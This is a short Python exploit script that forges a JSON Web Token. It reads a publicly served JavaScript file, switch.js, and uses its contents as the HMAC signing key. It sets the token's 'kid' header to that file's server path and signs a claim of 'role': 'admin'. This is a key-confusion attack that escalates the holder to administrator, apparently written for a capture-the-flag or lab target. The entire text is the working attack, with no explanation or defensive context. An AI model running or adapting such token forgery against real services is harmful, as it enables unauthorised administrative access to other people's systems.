import jwt
private_key = open('switch.js').read()
encoded = jwt.encode({'role': 'admin'}, private_key, algorithm='HS256',headers={'kid': '/var/www/html/dist/js/switch.js'})
print (encoded)
